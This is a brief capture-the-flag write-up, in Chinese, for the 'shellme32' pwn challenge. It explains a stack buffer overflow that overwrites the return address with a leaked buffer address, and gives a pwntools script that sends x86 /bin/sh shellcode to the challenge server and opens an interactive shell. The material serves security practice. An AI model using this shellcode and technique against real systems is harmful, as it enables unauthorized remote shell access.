### shellme32

> [附件](./shellme32)

给了buffer地址，可以溢出覆盖返回地址跳转到buffer执行shellcode

[Exploit script:](./shellme32)

```python
from pwn import *

p = remote('chal.tuctf.com',30506)

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

p.recvuntil('code?\n')
ret=int(p.recvline(),16)
p.sendline(shellcode_x86.ljust(40,'A')+p32(ret))
p.interactive()
```

